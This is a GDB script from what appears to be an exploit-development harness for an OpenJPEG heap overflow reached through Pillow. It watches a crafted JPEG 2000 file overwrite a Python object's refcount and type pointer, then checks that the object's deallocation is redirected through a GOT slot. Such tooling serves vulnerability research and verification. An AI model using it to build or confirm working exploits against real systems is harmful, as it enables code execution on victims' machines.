# Observe a natural dealloc call redirected through the system GOT slot.
# gdb observes only; it never writes memory and never continues into the call.
# Invoke from the harness OUTDIR with GOT address in $got:
#   gdb -q -batch -x got-target.gdb --args python3 pillow-probe.py FILE
# The $got convenience variable is set by the harness via -ex "set $got=...".
set pagination off
set breakpoint pending on
break j2k.c:5085
run
set $hit = 0
while $hit < 154
  continue
  set $hit = $hit + 1
end
set $b = (char*)l_cstr_index->tile_index[p_j2k->m_current_tile_number].tp_index
set $obj = (void*)($b + 24*154)
printf "PRE OBJ=%p REF=%ld TYPE=%016lx\n", $obj, *(unsigned long*)$obj, *(unsigned long*)($obj+8)
printf "WRITE W1=%016lx W2=%016lx\n", (unsigned long)l_current_pos, (unsigned long)(l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2)
printf "GOT_SLOT=%016lx GOT_VALUE=%016lx\n", (unsigned long)$got, *(unsigned long*)$got
until j2k.c:5091
printf "POST REF=%ld TYPE=%016lx\n", *(unsigned long*)$obj, *(unsigned long*)($obj+8)
delete 1
break _Py_Dealloc if $rdi == $obj
continue
printf "DEALLOC pc=%p rdi=%p TYPE=%016lx\n", $pc, $rdi, *(unsigned long*)($rdi+8)
printf "ARG_FIRST_QWORD=%016lx\n", *(unsigned long*)$rdi
si
si
si
printf "CHOSEN_CALL pc=%p\n", $pc
quit
